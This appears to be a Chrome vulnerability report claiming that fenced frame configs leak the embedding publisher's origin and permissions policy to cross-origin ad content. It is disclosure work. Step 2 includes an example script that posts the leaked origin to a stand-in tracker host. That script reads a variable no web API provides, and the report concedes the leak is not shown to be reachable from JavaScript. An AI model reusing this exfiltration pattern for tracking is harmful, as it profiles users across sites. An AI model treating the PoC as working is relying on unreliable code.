# VRP Report: Fenced Frame Config Leaks Parent Origin and Permissions to Cross-Origin Content

## Title

FencedFrameConfig.RedactFor() fails to redact effective_enabled_permissions_ and parent_permissions_info_ for cross-origin content — privacy information leak

## Severity

Medium (Privacy bypass in privacy-preserving feature, no compromised renderer)

## Component

Blink > FencedFrames

## Chrome Version

Tested against Chromium source at HEAD (April 2026). Affects all Chrome versions with Fenced Frames.

## Summary

When a `FencedFrameConfig` is redacted for delivery to the renderer process, the `effective_enabled_permissions_` and `parent_permissions_info_` fields are copied without any redaction, regardless of whether the recipient is `kCrossOriginContent`. This leaks the embedding page's origin and permissions policy declarations to content inside the fenced frame, violating the core privacy guarantee of fenced frames.

## Steps to Reproduce

### Step 1: Embedder page runs Protected Audience auction

```html
<!-- https://publisher.example/news.html -->
<script>
// Run Protected Audience auction
const result = await navigator.runAdAuction({
  seller: 'https://ssp.example',
  decisionLogicURL: 'https://ssp.example/decision.js',
  interestGroupBuyers: ['https://dsp.example'],
  resolveToConfig: true
});

// Load winning ad in fenced frame
const ff = document.createElement('fencedframe');
ff.config = result;
document.body.appendChild(ff);
</script>
```

### Step 2: Ad content inside fenced frame reads parent info

```html
<!-- Loaded inside fenced frame, cross-origin to publisher.example -->
<!-- https://ad-cdn.example/winning-ad.html -->
<script>
// The fenced frame properties sent to this renderer contain:
// - parent_permissions_info_.origin = https://publisher.example  ← LEAK
// - parent_permissions_info_.permissions_policy = [camera=*, geolocation=self, ...] ← LEAK
// - effective_enabled_permissions_ = [attribution-reporting, ...] ← LEAK

// The ad now knows:
// 1. It's displayed on publisher.example (should be hidden by fenced frame)
// 2. Which permissions policies the publisher has configured
// 3. Which APIs created the fenced frame (Protected Audience vs Shared Storage)

// This enables cross-site tracking:
// - Same ad on different sites learns each publisher's identity
// - Can build a profile of which sites the user visits
fetch('https://tracker.example/log', {
  method: 'POST',
  body: JSON.stringify({
    publisher: parent_permissions_info.origin,  // The leaked origin
    policies: parent_permissions_info.permissions_policy
  })
});
</script>
```

## Root Cause

```cpp
// content/browser/fenced_frame/fenced_frame_config.cc:182-185
// In FencedFrameConfig::RedactFor():
redacted_config.effective_enabled_permissions_ =
    effective_enabled_permissions_;
redacted_config.parent_permissions_info_ = parent_permissions_info_;

// content/browser/fenced_frame/fenced_frame_config.cc:304-307
// In FencedFrameProperties::RedactFor():
// Same pattern — copied without redaction regardless of entity type
```

Other fields in the config are properly redacted based on the `entity` parameter (`kEmbedder`, `kSameOriginContent`, `kCrossOriginContent`). But these two fields are always copied in full, even for `kCrossOriginContent`.

## Expected Result

`effective_enabled_permissions_` and `parent_permissions_info_` should be redacted (set to empty/null) when the entity is `kCrossOriginContent`, similar to how other fields like `mapped_url_` are only visible to specific entities.

## Actual Result

The full parent permissions info, including the parent's **origin**, is sent to the cross-origin renderer inside the fenced frame.

## Security Impact

1. **Fenced frame privacy guarantee violated**: The core purpose of fenced frames is to prevent information flow between the embedder and the embedded content. Leaking the embedder's origin directly contradicts this.
2. **Cross-site tracking enablement**: An ad network can learn which publishers display their ads for each user, enabling cross-site user profiling.
3. **Permissions fingerprinting**: Different sites have different permissions policies. The combination of policies creates a fingerprint of the embedding site.
4. **Affects both Protected Audience and Shared Storage**: Both privacy-preserving ad APIs create fenced frames and are affected.

## Suggested Fix

In `FencedFrameConfig::RedactFor()` and `FencedFrameProperties::RedactFor()`, redact these fields for `kCrossOriginContent`:

```cpp
if (entity != FencedFrameEntity::kCrossOriginContent) {
    redacted_config.effective_enabled_permissions_ =
        effective_enabled_permissions_;
    redacted_config.parent_permissions_info_ = parent_permissions_info_;
}
```

## PoC

The vulnerability is demonstrated by the code path analysis above. To verify in a live browser:
1. Enable Protected Audience API
2. Run an auction that results in a fenced frame
3. Inside the fenced frame, check if `parent_permissions_info_` is accessible via the FencedFrameConfig API or internal browser structures
4. Note: Direct JS access may require examining the config via DevTools or Mojo inspector

## Note on Observability

The fields are sent to the renderer process. Whether they are directly observable from standard web APIs depends on whether Blink exposes them through any JS-accessible interface. Even if not directly observable via JS, the data is in the renderer's memory and accessible to:
- Extensions running in the renderer
- Any renderer-side code with access to the Mojo pipe
- Spectre-class memory reading attacks (since SharedArrayBuffer may be available in cross-origin-isolated fenced frames)
